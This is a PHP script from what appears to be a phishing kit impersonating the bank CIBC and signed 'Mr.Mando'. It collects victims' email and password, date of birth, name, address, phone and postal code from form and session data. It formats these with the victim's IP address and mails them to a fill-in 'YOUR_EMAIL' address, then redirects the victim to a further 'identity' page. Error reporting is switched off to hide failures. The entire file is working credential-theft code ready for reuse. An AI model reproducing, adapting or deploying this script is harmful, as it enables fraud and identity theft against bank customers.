<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;

$_SESSION['email'] = $_POST['1'];
$_SESSION['ps'] = $_POST['2'];
$_SESSION['dobbb'] = $_POST['3'];





#Security information
$message = "
___________________________________________________________________
<br />
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

Full Name:  =>   <font color='#F31414'>".$_SESSION['name']."</font><br />
Date of Birth :  =>   <font color='#F31414'>".$_SESSION['dob']."</font><br />
Address Home    =>   <font color='#F31414'>".$_SESSION['adrress']."</font><br />
country:  =>   <font color='#F31414'>Canada</font><br />
Province  :  =>   <font color='#F31414'>".$_SESSION['province']."</font><br />
City :  =>   <font color='#F31414'>".$_SESSION['city']."</font><br />
Postal Code    =>   <font color='#F31414'>".$_SESSION['zip']."</font><br />
Number Phone:  =>   <font color='#F31414'>".$_SESSION['num']."</font><br />

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

Email Access           =>   <font color='#F31414'>".$_POST['1']."</font><br />
Password Access        =>   <font color='#F31414'>".$_POST['2']."</font><br />
DOB        =>   <font color='#F31414'>".$_POST['3']."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
___________________________________________________________________
<br />
||~~ BY ~~ Mr.Mando  ~~||
<br />
";

$subject  = " CIBC :  New Card-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Mr.Mando" . "\r\n";

$to="YOUR_EMAIL";
@mail($to,$subject,$message,$headers);
header('location: ../identity');

?>
